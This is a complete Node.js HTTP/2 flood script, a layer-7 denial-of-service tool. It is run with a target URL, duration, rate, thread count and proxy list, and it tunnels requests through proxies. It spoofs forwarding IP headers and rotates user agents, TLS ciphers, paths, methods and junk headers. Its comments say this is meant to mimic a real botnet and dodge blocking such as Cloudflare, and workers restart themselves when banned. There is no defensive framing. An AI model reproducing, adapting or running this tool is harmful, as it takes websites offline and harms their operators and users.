const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');

//const errorHandler = error => {
//    console.log(error);
//};
//process.on("uncaughtException", errorHandler);
//process.on("unhandledRejection", errorHandler);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9999);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();

 const ip_spoof3 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 118);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed3 = ip_spoof3();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6],
 }
 const sig = [    
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES128-GCM-SHA256"
 ];
const val = { 'NEl': JSON.stringify({
      "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
      "max-age": Math.random() < 0.5 ? 604800 : 2561000,
      "include_subdomains": Math.random() < 0.5 ? true : false}),
            }

 const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ]; 
 lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
 ];
 
 const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
 
 const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
 ];
 
 
const platformd = [
 "Windows",
 "Linux",
 "Android",
 "iOS",
 "Mac OS",
 "iPadOS",
 "BlackBerry OS",
 "Firefox OS",
];
const rdom2 = [
"cloudflare is my dog",
"Vietnam on top",
"Kid website",
"captcha is trash",
"dont bully my http ddos",
"client is hard",
"0day script",
];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var random = rdom2[Math.floor(Math.floor(Math.random() * rdom2.length))];
 var platformx = platformd[Math.floor(Math.floor(Math.random() * platformd.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

const rateHeaders = [
{ "A-IM": "Feed" },
{ "accept": accept },
{ "accept-charset": accept },
{ "accept-datetime": accept },
{ "viewport-height":"1080"  },
{ "viewport-width": "1920"  },
];

const rateHeaders2 = [
{ "Via": "1.1 " + parsedTarget.host },
{ "X-Requested-With": "XMLHttpRequest" },
{ "X-Forwarded-For": spoofed },
{"NEL" : val},
{"dnt" : "1" },
{ "X-Vercel-Cache": randstr(15) },
{ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=86400" },
{ "TK": "?" },
{ "X-Frame-Options": "deny" },
{ "X-ASP-NET": randstr(25) },
{ "te": "trailers" },
];

const rateHeaders4 = [
{ "accept-encoding": encoding },
{ "accept-language": lang },
{ "Refresh": "5" },
{ "X-Content-duration": spoofed },
{ "device-memory": "0.25"  },
{ "HTTP2-Setting" : Math.random() < 0.5 ? 'token64' : 'token68'},
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
];
const rateHeaders5 = [
{ "upgrade-insecure-requests": "1" },
{ "Access-Control-Request-Method": "GET" },
{ "Cache-Control": "no-cache" },
{ "Content-Encoding": "gzip" },
{ "content-type": "text/html" },
{ "origin": "https://" + parsedTarget.host },
{ "pragma": "no-cache" },
{ "referer": "https://" + parsedTarget.host + "/" },
];

const browserVersion = getRandomInt(125,129);
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    let brandValue;
    if (browserVersion === 125) {
        brandValue = `"Not_A Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 126) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 127) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 128) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 129) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    const isBrave = wfwf === 'Brave';

 const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langValue = isBrave
                            ? 'en-US,en;q=0.9'
                            : 'en-US,en;q=0.7';

    const userAgent = `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36`;
    const secChUa = `${brandValue}`;
 if (cluster.isMaster) {
    console.log(`--------------------------------------------`.gray);
    console.log('[>] Target: '.yellow + process.argv[2].blue);
    console.log('[>] Time: '.magenta + process.argv[3].blue);
    console.log('[>] Rate: '.blue + process.argv[4].blue);
    console.log('[>] Thread(s): '.red + process.argv[5].blue);
    console.log(`Made by @Otapengenkawin`.cyan);
    console.log(`--------------------------------------------`.gray);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
 async HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = await net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 const path = parsedTarget.path;
 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers["x-forwarded-proto"] = "https";
 headers[":path"] = path;
 headers[":scheme"] = "https";
 headers["upgrade-insecure-requests"]= "1";
 headers["sec-ch-ua"] = secChUa;
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-site"] = "none";
 headers["sec-fetch-user"] = "1";
 
  function randomPath() {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    let s = "/";
    for (let i = 0; i < getRandomInt(4, 18); i++) s += chars[getRandomInt(0, chars.length - 1)];
    if (Math.random() < 0.4) s += ".php";
    if (Math.random() < 0.7) s += "?" + randstr(getRandomInt(6, 14)) + "=" + randstr(getRandomInt(8, 22));
    if (Math.random() < 0.4) s += "&" + randstr(getRandomInt(3, 7)) + "=" + randstr(getRandomInt(3, 9));
    return s;
}
function randomMethod() {
    const methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH", "DELETE"];
    return methods[Math.floor(Math.random() * methods.length)];
}
function randomJunkHeaders() {
    let h = {};
    let n = getRandomInt(2, 7);
    for (let i = 0; i < n; i++) {
        let k = "X-" + randstr(getRandomInt(4, 12));
        h[k] = randstr(getRandomInt(6, 30));
    }
    // Duplicate X-Forwarded-For dan X-Real-IP
    if (Math.random() < 0.7) h["X-Forwarded-For"] = ip_spoof();
    if (Math.random() < 0.5) h["X-Real-IP"] = ip_spoof();
    return h;
}
function randomBody() {
    let b = "";
    let n = getRandomInt(256, 4096);
    for (let i = 0; i < n; i++) b += randstr(getRandomInt(1, 6));
    return b;
}
function newUserAgent() {
    const browserVersion = getRandomInt(124, 132);
    const platforms = [
        'Windows NT 10.0; Win64; x64',
        'Macintosh; Intel Mac OS X 10_15_7',
        'Linux; Android 11; SM-G991B',
        'X11; Linux x86_64',
        'iPhone; CPU iPhone OS 16_0 like Mac OS X',
        'iPad; CPU OS 15_4 like Mac OS X'
    ];
    const pf = platforms[getRandomInt(0, platforms.length - 1)];
    return `Mozilla/5.0 (${pf}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.${getRandomInt(1000,9999)}.0 Safari/537.36`;
}
function newSecChUa() {
    const browserVersion = getRandomInt(124, 132);
    const fwfw = ['Google Chrome', 'Brave', 'Chromium'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    return `"Not_A Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
}

function runFlooder() {
    function newFingerprint() {
        // Selalu hasilkan fingerprint baru tiap worker
        return {
            userAgent: newUserAgent(),
            secChUa: newSecChUa(),
            fingerprint: randstr(getRandomInt(8, 24)),
            pathSeed: randstr(getRandomInt(4, 12)),
            acceptLang: lang_header[getRandomInt(0, lang_header.length-1)],
            encoding: encoding_header[getRandomInt(0, encoding_header.length-1)],
            cipper: cplist[Math.floor(Math.random() * cplist.length)],
            proxy: randomElement(proxies),
        }
    }

    function advancedRandomPath(seed) {
        // Path tetap random tapi ada "seed" unik tiap worker
        let s = "/" + seed + randstr(getRandomInt(2,12));
        if (Math.random() < 0.4) s += ".php";
        if (Math.random() < 0.6) s += "?" + randstr(getRandomInt(6, 14)) + "=" + randstr(getRandomInt(8, 22));
        if (Math.random() < 0.35) s += "&" + randstr(getRandomInt(3, 7)) + "=" + randstr(getRandomInt(3, 9));
        return s;
    }

    let myID = Math.floor(Math.random() * 999999999) + Date.now(); // worker id random

    function killMyself() {
        console.log(`[Worker-${myID}] Recycle...`);
        process.exit(0);
    }

    function fire() {
        // SET fingerprint baru tiap 5-15 detik
        let fp = newFingerprint();

        const parsedProxy = fp.proxy.split(":");
        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: getRandomInt(30, 110),
        };

        Socker.HTTP(proxyOptions, async (connection, error) => {
            if (error) {
                setTimeout(fire, 500); // Proxy mati? Coba ganti proxy!
                return;
            }

            connection.setKeepAlive(true, 100000);

            const tlsOptions = {
                rejectUnauthorized: false,
                host: parsedTarget.host,
                servername: parsedTarget.host,
                socket: connection,
                ecdhCurve: "X25519",
                ciphers: fp.cipper,
                secureProtocol: "TLS_method",
                ALPNProtocols: ['h2', 'http/1.1'],
                sigalgs: sig.join(':'),
                session: crypto.randomBytes(getRandomInt(48, 164))
            };

            let tlsConn;
            try {
                tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions);
            } catch {
                connection.destroy();
                setTimeout(fire, 200);
                return;
            }
            tlsConn.setKeepAlive(true, 60000);

            let client;
            try {
                client = await http2.connect(parsedTarget.href, {
                    protocol: "https:",
                    settings: {
                        headerTableSize: 4096,
                        maxConcurrentStreams: getRandomInt(250, 1024),
                        initialWindowSize: getRandomInt(65535, 204800),
                        maxHeaderListSize: 8192,
                        maxFrameSize: getRandomInt(16384, 16777215),
                        enablePush: false
                    },
                    maxSessionMemory: 4096,
                    maxDeflateDynamicTableSize: 4294967295,
                    createConnection: () => tlsConn,
                    socket: connection,
                });
            } catch {
                tlsConn.destroy();
                connection.destroy();
                setTimeout(fire, 300);
                return;
            }

            client.settings({
                headerTableSize: 4096,
                maxConcurrentStreams: getRandomInt(250, 1024),
                initialWindowSize: getRandomInt(65535, 204800),
                maxHeaderListSize: 8192,
                maxFrameSize: getRandomInt(16384, 16777215),
                enablePush: false
            });

            // --- Stream burst (mirip botnet real) ---
            let stream_count = getRandomInt(16, 40);
            let streamRate = getRandomInt(args.Rate * 1.5, args.Rate * 3.5);

            for (let s = 0; s < stream_count; s++) {
                setInterval(() => {
                    // Setiap stream fingerprint, header, path, method selalu berubah
                    let method = randomMethod();
                    let pathRand = advancedRandomPath(fp.pathSeed + s + Date.now());
                    let headersMix = {
                        ...headers,
                        ":method": method,
                        ":path": pathRand,
                        "user-agent": fp.userAgent,
                        "sec-ch-ua": fp.secChUa,
                        "accept-language": fp.acceptLang,
                        "accept-encoding": fp.encoding,
                        ...rateHeaders[getRandomInt(0, rateHeaders.length-1)],
                        ...rateHeaders2[getRandomInt(0, rateHeaders2.length-1)],
                        ...rateHeaders4[getRandomInt(0, rateHeaders4.length-1)],
                        ...rateHeaders5[getRandomInt(0, rateHeaders5.length-1)],
                        ...randomJunkHeaders(),
                        "cookie": `sessid=${fp.fingerprint};id=${myID};rnd=${randstr(7)}`,
                        "x-botid": myID + "-" + randstr(5),
                        "x-reqseq": Date.now() + "-" + Math.random().toString().slice(2,8),
                        "cache-control": "no-store, no-cache, must-revalidate, max-age=0"
                    };

                    if (Math.random() < 0.25) headersMix["origin"] = "https://" + randstr(4) + "." + parsedTarget.host;
                    if (Math.random() < 0.19) headersMix["Referer"] = "https://" + parsedTarget.host + "/" + randstr(getRandomInt(2, 12));
                    if (Math.random() < 0.20) headersMix["Forwarded"] = `for=${ip_spoof()};proto=https;by=${ip_spoof()}`;

                    let req = client.request(headersMix);

                    if (["POST", "PUT", "PATCH"].includes(method)) {
                        let repeatBody = getRandomInt(1, 4);
                        for (let j = 0; j < repeatBody; j++) {
                            req.write(randomBody());
                        }
                    }
                    req.on("response", res => {
                        if ((res[":status"] && (res[":status"]+"").startsWith("4")) || (res[":status"] && (res[":status"]+"").startsWith("5"))) {
                            // Jika ban/bot-block, langsung kill biar auto restart by cluster
                            setTimeout(killMyself, getRandomInt(500, 4000));
                        }
                        req.close();
                        req.destroy();
                    });
                    req.on("error", () => {
                        try { req.destroy(); } catch { }
                    });
                    req.end();
                }, getRandomInt(80, 400));
            }

            client.on("close", () => {
                client.destroy();
                connection.destroy();
                setTimeout(fire, 100);
            });
            client.on("error", () => {
                try { client.destroy(); } catch { }
                try { connection.destroy(); } catch { }
                setTimeout(fire, 200);
            });

            // Auto ganti fingerprint setiap 5-15 detik (anti-pattern, anti-block)
            setTimeout(() => {
                try { client.destroy(); } catch {}
                try { connection.destroy(); } catch {}
                setTimeout(fire, getRandomInt(80, 600));
            }, getRandomInt(5000, 15000));
        });
    }
    fire();
}
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);